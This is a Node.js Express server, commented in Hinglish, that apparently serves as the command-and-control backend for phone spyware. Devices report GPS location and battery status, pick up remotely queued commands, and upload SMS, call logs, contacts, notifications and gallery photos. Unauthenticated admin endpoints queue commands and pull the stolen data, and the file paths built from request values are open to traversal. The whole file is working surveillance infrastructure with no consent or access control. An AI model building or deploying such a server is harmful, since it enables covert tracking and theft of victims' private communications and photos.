const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Storage Setup
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors());

// --- YE BADLAV HAI: Photo badi hoti hai isliye limit 50MB ki hai ---
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

app.use(express.static(__dirname));

// Live RAM Memory
let devicesStatus = {}; 

// --- PHONE SIDE API ---

app.post('/api/status', (req, res) => {
    let { device_id, model, battery, version, charging, lat, lon } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID provided" });

    const id = device_id.toString().trim().toUpperCase();

    // 1. Pehle se maujood command check karo
    const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";

    // 2. Map Link generate karo
    let mapLink = "#";
    if (lat && lon && lat !== 0) {
        mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
    }

    // 3. Update RAM
    devicesStatus[id] = {
        ...devicesStatus[id], 
        id: id,
        model: model || devicesStatus[id]?.model || "Unknown Device",
        battery: battery || 0,
        version: version || "--",
        charging: (charging === 'true' || charging === true),
        lat: lat || 0,
        lon: lon || 0,
        mapLink: mapLink,
        lastSeen: Date.now(),
        command: "none" // Phone ko response milne ke baad server pe command reset
    };

    if (pendingCommand !== "none") {
        console.log(`📡 [PING] ${id} | Command Picked: ${pendingCommand}`);
    }
    
    // Phone ko command bhejo
    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];
        
        if (historyTypes.includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) { existingData = []; }
            }
            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            const finalData = [...newDataArray, ...existingData].slice(0, 1000);
            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        } else {
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }
        res.json({ status: "success" });
    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

app.post('/api/upload_gallery', (req, res) => {
    let { device_id, image_data, date } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_gallery.json`);

    try {
        let galleryData = [];
        if (fs.existsSync(filePath)) {
            try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
        }
        
        // --- YE BADLAV HAI: Nayi photo hamesha upar aayegi (unshift) ---
        galleryData.unshift({ 
            time: date || new Date().toLocaleString(), 
            uploadedAt: Date.now(), 
            image: image_data 
        });

        // Sirf last 100 photos rakho taaki file bahut badi na ho jaye
        fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 100), null, 2));
        
        console.log(`📸 [GALLERY] New photo uploaded from ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error("Gallery Save Error:", error.message);
        res.status(500).json({ error: "Failed" });
    }
});

// --- ADMIN API ---

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false });
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline });
});

app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing ID or Command" });
    
    const id = device_id.toUpperCase().trim();
    if (!devicesStatus[id]) devicesStatus[id] = { id: id };
    
    devicesStatus[id].command = command;
    console.log(`🚀 [CMD QUEUED] ${command} -> ${id}`);
    res.json({ status: "success" });
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

app.listen(PORT, () => console.log(`🔥 SERVER ON ${PORT} WITH 50MB LIMIT`));
